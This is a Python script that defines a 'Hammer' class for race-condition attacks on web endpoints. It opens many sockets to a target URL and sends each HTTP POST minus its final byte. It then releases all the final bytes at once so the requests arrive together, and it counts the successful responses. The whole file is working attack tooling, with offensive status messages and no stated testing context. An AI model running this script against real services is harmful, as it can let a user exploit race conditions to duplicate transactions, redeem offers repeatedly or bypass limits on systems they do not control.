import socket
import time
import threading
from urllib.parse import urlparse
from colorama import Fore, Style, init

init(autoreset=True)

class Hammer:
    def __init__(self, target_url, json_payload, threads=50):
        self.target_url = target_url
        self.payload = json_payload
        self.threads = threads
        self.sockets = []
        self.parsed_url = urlparse(target_url)
        self.host = self.parsed_url.hostname
        self.port = self.parsed_url.port or 80
        self.path = self.parsed_url.path

    def _create_request_packet(self):
        """Constructs the raw HTTP request string."""
        import json
        body = json.dumps(self.payload)
        length = len(body)
        
        # NOTE: We construct the HTTP headers manually.
        request = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            f"Content-Type: application/json\r\n"
            f"Content-Length: {length}\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n" # End of headers
            f"{body}"
        )
        return request.encode() # Convert to bytes

    def prepare(self):
        """Phase 1: Open sockets and send 99% of the data."""
        print(f"{Fore.CYAN}[*] HAMMER: Opening {self.threads} sockets to {self.host}...")
        
        request_bytes = self._create_request_packet()
        # IMPORTANT: We slice off the last byte (the final curly brace or newline)
        # Actually, let's just hold the VERY LAST byte of the body.
        self.partial_req = request_bytes[:-1] 
        self.last_byte = request_bytes[-1:]

        for _ in range(self.threads):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.host, self.port))
                s.send(self.partial_req) # Send everything EXCEPT the last byte
                self.sockets.append(s)
            except Exception as e:
                print(f"{Fore.RED}[!] Socket Fail: {e}")
        
        print(f"{Fore.YELLOW}[*] HAMMER: {len(self.sockets)} sockets primed and waiting.")

    def fire(self):
        """Phase 2: The Last-Byte Trigger."""
        if not self.sockets:
            return 0

        print(f"{Fore.RED}[*] HAMMER: FIRING!!!")
        start_time = time.perf_counter()

        # THE MAGICAL LOOP
        # Sending 1 byte is nearly instantaneous for the OS kernel
        for s in self.sockets:
            try:
                s.send(self.last_byte)
            except:
                pass

        end_time = time.perf_counter()
        duration = (end_time - start_time) * 1000
        print(f"{Fore.GREEN}[+] HAMMER: Burst complete in {duration:.2f}ms")
        
        # Cleanup
        success_count = 0
        for s in self.sockets:
            try:
                resp = s.recv(1024)
                if b"200 OK" in resp:
                    success_count += 1
                s.close()
            except:
                pass
        
        return success_count
